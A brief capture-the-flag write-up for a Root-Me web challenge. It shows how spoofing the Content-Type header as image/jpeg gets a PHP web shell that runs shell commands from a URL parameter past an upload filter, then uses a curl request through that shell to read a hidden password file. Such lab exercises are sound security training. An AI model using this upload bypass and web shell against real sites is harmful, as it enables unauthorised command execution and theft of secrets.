WebServer Challenge 21 - File Upload Mime Type

Synopsis: Your goal is to hack this photo galery by uploading PHP code.
Retrieve the validation password in the file .passwd.


By changing the Content-Type in the HTTP upload to a supported format such as: Content-Type: image/jpeg

Content-Disposition: form-data; name="file"; filename="x.php"
Content-Type: image/jpeg

<?php
system($_GET['c']);
?>



We were able to upload x.php and retrieve the password:
curl http://challenge01.root-me.org/web-serveur/ch21/galerie/upload/vtdokqi3eu5u5d12lsl5m4b9r6//x.php?c="cat ../../../.passwd"
